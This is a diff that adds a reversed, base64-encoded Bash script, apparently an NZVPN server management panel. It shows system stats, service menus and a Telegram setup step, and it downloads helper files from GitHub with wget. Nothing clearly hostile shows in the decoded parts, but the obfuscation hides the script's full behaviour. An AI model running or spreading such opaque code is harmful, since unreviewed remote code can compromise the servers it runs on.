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
+kICIulGIpBicvZmCi03QOtHJkSp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4
+k0zc1RXY0N3XlNWa2JXZzpwc1RXY0N3XlNWa2JXZzBCbhN2bspwbkByOi0XXAt1clNWa2JXZzFye
+oNWZgwHfgwGb152L2VGZv4jMgISfdlGJbNXZjlmdyV2c7RiIgUmdpR3Yh1ycpBCb0NWblR3c5NHK
+4VGdfNXd0FGdzpQKlZXa0NWYK4WagIyc1RXY0N3XlNWa2JXZzRiIgU2chNmCpIib39mbr5WdiAyb
+0NnCpUmdpR3Yh5WaKszOgISfOVURSd0XUh0RJx0ekISPy9GbvN2XzVHdhR3cKIyZulmbuVnUi0Dd
+0FGdzpQKkVGbpFmZKszOgISfEVkU7RiI9I3bs92YfNXd0FGdzpgIkVGcw9GdTJSP0hXZ091c1RXY
+0FGdzpQKn5Wa0FmdpR3YhpwO7AiI9RURStHJi0jcvx2bj91c1RXY0NnCiI3byJXRi0Dd4VGdfNXd
+2lGdjFWZkpwO7AiI9d1TMxURZtHJi0jcvx2bj91c1RXY0NnCi4iLucmbpRnchR3Ui0Dd4VGdfNXd
+i03VPxETFl1ekISPy9GbvN2XzVHdhR3cKIiLu4yZulGcw9GdTJSP0hXZ091c1RXY0NnCpcmbpRXY
+hNXZKszOgISfEVkU7RiI9I3bs92YfNXd0FGdzpgIud3butmbVJSP0hXZ091c1RXY0NnCpoiC7sDI
+0N3ek0ncvx2bj91c1RXY0N3ekAiO91Vaks1cl1WYutHJ95UQZN0ekISP0VHc0V3bfNXd0FGdzpwY
+wRXdv91c1RXY0NHJiASZtAyboNWZoQSPlxmYpNXa29lblx2X0hXZ0pgI9NkT7RSf0hXZ091c1RXY
+lxmYpNXa29lblx2X0hXZ0pQKj1CIjdHI8ByJn9yLtpSX7kTLws1WcJWM4x1LzdCIkV2cgwHIiQXd
+g0CIoRHZpd3X15WZthCKk0DbhR3b091ZulGZkFGcKkSKxASLgUGbil2cpZ3XuVGbfRHelRHKoQSP
+hBnCpkiMg8CIsFGdvR3Xn5WakRWYwhCKk0DdmVGbfdmbpRGZhBnCpkSZsJWazlmdf5WZs9Fd4VGd
+oQiIgUWLg8GajVmCpkCdmVGbfdmbpRGZhBHItACbhR3b091ZulGZkFGcogCJ9QHanlmcfdmbpRGZ
+nMnKlcCImRnbpJHcoQSf0VHc0V3bfNXd0FGdztHJpQnZlx2Xn5WakRWYwRCInMnKlcCImRnbpJHc
+iDIliDIliDIliDIlizJli33VPxETFl1ekICIl1CIvh2YlpQZu9GZKISK0h2ZpJ3Xn5WakRWYwRCI
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+h9Fc1RXZzBibvlGdj5WdmpQfKISfD50ekQKliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+iDIliDCc1t2YhJEIvRXdBBSZyV3ZpZmbvNEIASp4ASp4ASp4iAyboNWZKsHIpgCc1t2YhJ2XvRXd
+g8GajVmCuVGa0ByOdBiIm52bj5SbhJ3ZlxWZ09ibwZXa69yY0V2LiAiZtASIgsFImlmCiAIliDIl
+vBCc1t2YhJGIsFWduFWbgEGIuVncgU2chVGbQBiLkVmc1dWam52bjBCdv5GIzlGItFmcnVGblRlI
+2JXZ05WagAXdrNWYiBiclRnbFJCIw1CIkFWZypQampgbyVHdlJnCi4Cc1BCdpBCdlNHIvRHIlNmb
+lRnbpBiIgoTZsJWYzlGZg8GdgADIyVGduVEIukCNyACLyEDIsYDIs4yZuUGKgMnc19Gag4WagwWY
+sFmdulkIg8GajVmCuVGa0ByOd1FIksSX50CMb5FI+1DIiwWY2JXZ05WakICIbtFIhAiZppAbhZnc
+yACbtAiYhRnbvJ3YooQampgbyVHdlJnCi4iclJWb15GIhBiclRnblBSZzFWZsBFIuQXdw5WagQWa
+ppQLgIWY052byNGI8BSKiAXdrNWYi1yb0VXYt4Gc2lmegMiIgYXLgAXZydGI8BCbsVnbvYXZk9iP
+7RyLqACMi0TZsVHZlh2Yz9lbvJ3YgwWYj9GbK4WZoRHI70FIwACdn1CIiwWY2JXZ05WakICIbBiZ
+jN3Xu9mcjtHJiAyboNWZgsDbsVnbvYXZk9iPyACbtAiYhRnbvJ3YoogIqAiKgoCI9xWY2JXZ05Wa
+gwGb152L2VGZv4DIwV3ajFmYgg2cuIXZwxWZo9lbwZXa69ibpJ2LsF2Yvx2LyNXdvASflxWdkVGa
+gAXdrNWYiByb0VXQiAyboNWZK0CIiFGdu9mcjBCfgkiIwV3ajFmYt8Gd1FWLuBndppHIjASMm4jM
+BJCIvh2YlpQZzxWZKIiLpMHKyV3boBSfsFmdyVGdul2ekASeyVmdlBib1JHIvRHIkVGb1RWZoN2c
+192YjF2XlRXYlJ3Yg42bpR3YuVnZK0nCpZmCi4CZlxmYhNXakBiblVmYgMXYoBCc1t2YhJGIvRXd
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOjUKefX9ETMVUW7RiIgUWLg8GajVmCyFWZsNmC7BSKoQnb
+9d1TMxURZtHJ05WdvN2YBBSZ0FWZyNUfEVkU7RCIv8CgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+OtHJQSp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4v8CI
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03Q
+MtHJgACICSp49d1TMxURZtHJiASZtAyboNWZKISfD50ekIIliDCIgACIgACIgACIgACIgACIgACI
+gACIgACIgACIgACIgAibwZXaaBSZ0FWZyNUfFRVSId1XEx0TCtHJg03QOtHJpETfFVFTC9FVIdUS
+9d1TMxURZtHJiASZtAyboNWZKISfD50ekIIli33VPxETFl1ekACIgACIgACIgACIgACIgACIgACI
+gACIgACIuBndppFIsFWayRVfFRVSId1XEx0TCtHJg03QOtHJpITfFVFTC9FVIdUSMtHJgACICSp4
+iASZtAyboNWZKISfD50ekIIli33VPxETFl1ekACIgACIgACIgACIgACIgACIgACIgACIgACIgACI
+g8Gdgs2YhJUfFRVSId1XEx0TCtHJg03QOtHJpATfFVFTC9FVIdUSMtHJgACICSp49d1TMxURZtHJ
+KISfD50ekIIli33VPxETFl1ekACIgACIgACIgACIgACIgACIgACIgACIgACIgACI15WZNBibpFWT
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACICSp49d1TMxURZtHJiASZtAyboNWZ
+iDIliDIliDIliTJli33VPxETFl1ekICIl1CIvh2YlpgI9NkT7RigUKOIgACIgACIgACIgACIgACI
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+gIXZ05WRiACctACZhVmcKISfD50ekgJliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+uFWbfVGdhVmcjBSKxogbpBSZjl2boNGJgU2chNmClNWavh2YgICI60lMtAzWgU2Yp9GajBic19We
+poiC7sDIuJXd0VmcgkCMKszOgQnb192YjF2XsFWayR3XlRXYlJ3YgkiMKszOgQnb192YjF2XsFWd
+l12XwV3ajFmYfd3boNHIu9Wa0Nmb1ZmC9pwYhNXZKszOgIiLu9Wa0B3bgQWasFmdulkIg8GajVGI
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOjUKefX9ETMVUW7RiIgUWLg8GajVmCyFWZsNmC7BSKoUnb
+MVUW7RSZy9GdzVmUvAXdrNWYC1XRVxkQfRFSHlET7RCIv8CgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+7RCkUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUK+LvASfX9ET
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgIIli33VPxETFl1ekICIl1CIvh2YlpgI9NkT
+Jx0ekACIgIIli33VPxETFl1ekICIl1CIvh2YlpgI9NkT7RigUKOIgACIgACIgACIgACIgACIgACI
+gACIgACIgACIgACIgACIgEGdhREIwV3ajFmQ9VEVJh0VfRETPJ0ekASfD50ekkSM9VUVMJ0XUh0R
+CSp49d1TMxURZtHJiASZtAyboNWZKISfD50ekIIli33VPxETFl1ekACIgACIgACIgACIgACIgACI
+gACIgACIgASY0FGRgUmcvR3clJVfFRVSId1XEx0TCtHJg03QOtHJpITfFVFTC9FVIdUSMtHJgACI
+MVUW7RiIgUWLg8GajVmCi03QOtHJCSp49d1TMxURZtHJgACIgACIgACIgACIgACIgACIgACIgACI
+gACc1t2YhJEIvRXdB1XRUlESX9FRM9kQ7RCI9NkT7RSKz0XRVxkQfRFSHlET7RCIgAigUKefX9ET
+l1CIvh2YlpgI9NkT7RigUKefX9ETMVUW7RCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI
+VBic1RXQ9VEVJh0VfRETPJ0ekASfD50ekkCN9VUVMJ0XUh0RJx0ekACIgIIli33VPxETFl1ekICI
+KISfD50ekIIli33VPxETFl1ekACIgACIgACIgACIgACItFmcnVGblRFIpNXYrlmZpR3bOByZuFGb
+FRVSId1XEx0TCtHJg03QOtHJpATfFVFTC9FVIdUSMtHJgACICSp49d1TMxURZtHJiASZtAyboNWZ
+CSp49d1TMxURZtHJgACIgACIgACIgACIgACIgACIgACIgACIgACI15WZNBibpFWTg8Gdgs2YhJUf
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03QOtHJ
+UKOgUKOlUKefX9ETMVUW7RiIgUWLg8GajVmCi03QOtHJCSp4gACIgACIgACIgACIgACIgACIgACI
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+UKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+5BiclRnbFJCIw1CIkFWZypgI9NkT7RCmUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOg
+vwWYj9GbvI3c19CIpEjCulGIlNWavh2YkASZzF2YKU2Yp9GajBiIgoTX00CMbBSZjl2boNGIyV3b
+sVGaf5Gc2lmev4Wai9CbhN2bs9iczV3LgkiMKszOgAXdrNWYiBCaz5iclBHblh2XuBndpp3LulmY
+i9CbhN2bs9iczV3LgkCNKszOgAXdrNWYi91b0VXYfBXd0V2cgkyMKszOgUmcvR3clJHIoNnLyVGc
+vh2YlBSKqowO7AibyVHdlJHIpAjC7sDItFmcnVGblRXLwVHdlNHIoNnLyVGcsVGaf5Gc2lmev4Wa
+nF2czVWbfRWZylGc4V2X39GazBibvlGdj5WdmpQfKMWYzVmC7sDIi4ibvlGdw9GIklGbhZnbJJCI
+iDIliDIliDIliDIliDIliDIli3HRFJ1ek4GXiASZtAyboNWZKIXYlx2YKsHIpgCdphXZfRmbh9VZ
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+iDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIliDIl
+gACIgACIgACI9RURStHJiASZtAyboNWZKISfD50ekAIliDIliDIliDIliDIliDIliDIliDIliDIl
+tAyboNWZKISfD50ekACIgACIgACIgACIhE0USF0VVxUQEV0SggUQMVEVgEEROFEIJNlTFNVSMBCI
+ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp49RURStHJiASZ
+ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4
+OtHJASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4ASp4
+yV2cgkGZg4EUWlkWg4WYuFWehxGIltGIzV2crFUfFRVSId1XEx0TCtHJiASZtAyboNWZKIibc13Q
+OBlVgMXY0lmdpR3ahBSYsF2ZlNlIgUWLg8GajVmCi4ibhtWa05WZolGZggWYsVGdgEGZuFGIyVmd
+hpmbhBnclBXbl1GIrVHduVlIgUWLg8GajVmCi4GXuk2ZhxGIpN3ZuVnZyVmYg4WYrFGIrFGZpRHI
+pNnIgUWLg8GajVmCiwibh5WY5FGbgkGbhJWbltGIuF2amlGdrF2ZuVWbg4WYkBSaz5WZzlGbgcmb
+g8GajVmCi4GXgcDO4EDO2ITO3cDOyYzLl1mLhd3LvozcwRHdoBibp1GZhBSan5WdiVHag4WYrFGb
+pR3ahBibhtWYg4WYuFWehxGIscmbhpmbhBnclBXakBCahxWZ0V2U95URFJ1RfRFSHlET7RiIgUWL
+39GazBibvlGdj5WdmpQfKADI0lGelpgIuxVfD50ek4ycpRXYt9GdvBSYyF2YlNHIpxWYi1WZrBiZ
+pBHel91dvh2cK4WZoRHI70FIiQWZylGc4VmLv4Gc2lmevMGdl9iIgYWLgsFImlmC7BSKoUnbl12X
+0F2Ys9GbgwHIi4EUWlkWgAFRVJCI0VGbnlmZKIXYlx2YKkmZKQXa4V2Xk5WYfV2ZhN3cl12XkVmc
+v8CgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOgUKOjUKefX9ETMVUW7RiIgUWLg8GajVmC
+iDIliDIliDIliDIliDIliDIliDIli/yLg03VPxETFl1ekckTJxURO5UVUByROV1RB1nTBl1Q7RCI
+lNWa2JXZz91dhJHZfpAbl5WYw91bm5WafdXYyR2XKISfD50ekAJliDIliDIliDIliDIliDIliDIl
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgIIli33VPxETFl1ekICIl1CIvh2Ylpwc1RXY0N3X
+gAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03QOtHJCSp4gACIgACIgACIgACIgACIgACIgACIgACI
+gACIgACIgACduV3bjNWQgUGdhVmcD1XRUlESX9FRM9kQ7RCI9NkT7RSKx0XRVxkQfRFSHlET7RCI
+MVUW7RiIgUWLg8GajVmCi03QOtHJCSp49d1TMxURZtHJgACIgACIgACIgACIgACIgACIgACIgACI
+05WdvN2YBBydl5WZS1XRUlESX9FRM9kQ7RCI9NkT7RSKy0XRVxkQfRFSHlET7RCIgAigUKefX9ET
+g8GajVmCi03QOtHJCSp49d1TMxURZtHJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI
+lxWZE1XRUlESX9FRM9kQ7RCI9NkT7RSKz0XRVxkQfRFSHlET7RCIgAigUKefX9ETMVUW7RiIgUWL
+OtHJCSp49d1TMxURZtHJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACduV3bjNWQgUGd
+X9FRM9kQ7RCI9NkT7RSK00XRVxkQfRFSHlET7RCIgAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03Q
+MxURZtHJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIulWYt9GRgU2ZuFGaD1XRUlES
+9NkT7RSK10XRVxkQfRFSHlET7RCIgAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03QOtHJCSp49d1T
+gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIzRnb192YjFEI0NXaM1XRUlESX9FRM9kQ7RCI
+VxkQfRFSHlET7RCIgAigUKefX9ETMVUW7RiIgUWLg8GajVmCi03QOtHJCSp49d1TMxURZtHJgACI
+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
+tIXZ0xWamRXZuBybkV3cKQnblR3cpNnclBXLyVGdslmZ0VmbgQnblR3cpNnclBXLzVGbiFGdwlGI
+pNnblRmblBXZkBCbsFGdz5Wag4WYkByUPBSZ0FGZwVFIuEjIg8GajVmClZXYzBCduVGdzl2cyVGc
+gIiZlRmZu92YtU2Yy9mZt0iI9ojOz52bpRHcPpjOntGcEBybtASetASZkFmcnBXdgQHchpgIu4iL
+gQXZndHI51CIsxWY0NnbpBCdwFmCiQGbvZmbvNWLlNmcvZWLtISP6ozcu9Wa0B3T6ozZrBHRg8WL
+05WZIBiLyICIvh2YlpwclRXYjlmZpRnclNWLhNWLlRXYkBXdKMXZ0F2YpZWa0JXZj1SYjBCbyV3Y
+v4jMg4Gc2lmegA3b0NHIsR3YtVGdzl3cKIiLu4SKhRWYgE2appGKgEWbhxGIlNWa2JXZzBibhtWa
+gYWLg0mcKIiLu4SKhRWYgE2appGKgEWbhxGI5JXYulmYgMXdwFGSg4yMiAyboNWZKwGb152L2VGZ
+u4EUWlmWgkWbzVmcgAXayt2cgQWYvxmb39GRg4CNiAyboNWZK4Gc2lmev4Wai9CbhN2bs9iczV3L
+t92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHagg2cukmevQ3bvJ3Lg8ULgQXZndnCi4iL
+hRXdjVGelBibppXagkmclJEIuUjIg8GajVmCoNnLpp3LulWYt9ibwZXa61CckV3LsVmbuVHdsF2L
+0NnbpBCcpJ3azBibhtmbhxWYKBiL2ICIvh2YlpAaz5Sa69Cdv9mcvACerACZv1GajpgIu4iLlxmY
+gQWblR3c5NHIkF2bsVmUg4yNiAyboNWZKg2cukmevQ3bvJ3Lg8GZ1NnCi4iLu4EUWlmWgk2chxWY
+zBCb0NWblR3c5NnCkF2bsVmct42btVWYkBCb0NWblR3c5NnCi4iLuU2YpZnclNHI0JXY0NHIuFGZ
+yV2cgMXd0FGdzByalNEIugjIg8GajVmCuBndppHIlxmYh5WZgwGdj1WZ0NXezpgbwZXa6BCdyFGd
+0NnbJBShcKuIg8GajVmCyV2ZhBXLv5WLtAibwZXa6Byc1RXY0NHIsR3YtVGdzl3cKIiLu4SZjlmd
